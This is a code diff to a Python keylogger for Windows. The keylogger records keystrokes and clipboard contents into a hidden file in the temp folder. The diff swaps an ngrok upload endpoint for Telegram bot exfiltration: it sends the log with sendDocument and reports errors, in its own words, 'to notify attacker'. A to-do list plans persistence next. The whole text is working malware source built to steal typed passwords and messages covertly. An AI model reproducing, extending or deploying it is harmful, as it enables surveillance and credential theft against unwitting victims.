@@ -1,4 +1,12 @@
+# _*_ coding: utf-8 _*_
+
 # Windows
+# tested on Windows 10
+
+# to do:
+# logging keystrokes of virtual keyboard
+# persistence
+
 
 
 # import modules
@@ -10,34 +18,38 @@ from pynput import keyboard
 from pyperclip import paste   # for getting the clipboard data (supports cross platform)  
 from datetime import datetime
 from time import sleep
-from requests import post
+import requests
 
 
 # <-- Initializing global values -->
 
 # change this
-SERVER_ADDRESS = 'https://bcd4-103-55-96-137.ngrok-free.app/upload'         # replace the Address
-INTERVAL = 10                                                               # set interval according to your requirement
+TOKEN = ''                    # Telegram API Token
+CHAT_ID = ''                  # Telegram Chat ID
+INTERVAL = 60                 # set interval according to your requirement
 
 
-
-# <---  no change required   --->
-duplicate = ['']
 
 # Windows
 temp_dir = gettempdir()
 FILENAME = f'{temp_dir}\\{datetime.now().strftime(".%d%m%Y%H%M%S")}.log'
 
 
+
+# to notify attacker if any shits happen
+def alarm(msg) -> None :
+    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')
+
+
 #keystroke record
 class keylogger:
 
     # init
-    def __init__(self):
-        pass
+    def __init__(self) -> None :
+        self.duplicate = ['']
 
     # saving the file
-    def savefile(self,data):
+    def savefile(self,data) -> None :
         try:
             file_exists = isfile(FILENAME)
 
@@ -46,45 +58,54 @@ class keylogger:
             
             if not file_exists and name == 'nt':  # check if the system is Windows and file didn't exist before
                 system(f'attrib +h {FILENAME}')
-        except:
-            pass
+        except Exception as e:
+            alarm(f'Error: {e}')
     
 
-    def Keylogging(self):
-        def on_key_press(key):
+    def Keylogging(self) -> None :
+        def on_key_press(key) -> None :
+
+            def IsDuplicate(data) -> bool :
+                    if data and data != self.duplicate[0]:
+                        self.duplicate[0] = data
+                        return False
+                    return True
+
             try:
                 # to get the clipboard data
                 data = paste()
 
-                if data != duplicate[0]:
-                    self.savefile(f'Clipboard data: {data}\n')
-                    duplicate[0] = data
+                if data and not IsDuplicate(data):
+                    self.savefile(f'clipboard data {data}\n')
 
                 # logging the keystrokes
                 self.savefile(f'{str(key)}\n')
 
-            except:
-                pass
+            except Exception as e:
+                alarm(f'Error: {e}')
 
 
-        # Create listener objects
-        with keyboard.Listener(on_press=on_key_press) as listener:
-            listener.join()
+        try:
+            # Create listener objects
+            with keyboard.Listener(on_press=on_key_press) as listener:
+                listener.join()
+        except Exception as e:
+            alarm(f"Listener Error: {e}")
 
 
     # destructor
-    def __del__(self):
+    def __del__(self) -> None :
         pass
 
 
-# send the file to the http server at regular interval
+# send the file to the Telegram at regular interval
 class uploader:
     
     # init
-    def __init__(self):
+    def __init__(self) -> None :
         pass
     
-    def upload_file_periodically(self):
+    def upload_file_periodically(self) -> None :
         
         sleep(INTERVAL)
         
@@ -92,19 +113,21 @@ class uploader:
             try:
                 if exists(FILENAME):
                     with open(FILENAME, 'rb') as fh:
-                        files = {'file': fh}
+                        files = {'document': fh}
+                        resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}',files=files)   # sending the file
 
-                        post(SERVER_ADDRESS, files=files)   # sending the file
+                        if resp.status_code != 200:
+                            alarm(f'Error Code: {resp.status_code}')
 
                 else:
-                    pass  # file not created/found
+                    alarm(f'File not created or found!')  # file not created/found
 
                 sleep(INTERVAL)
 
-            except:
-                pass
+            except Exception as e:
+                alarm(f'Error Occured: {e}')
 
-    def __del__(self):
+    def __del__(self) -> None :
         pass
 
 
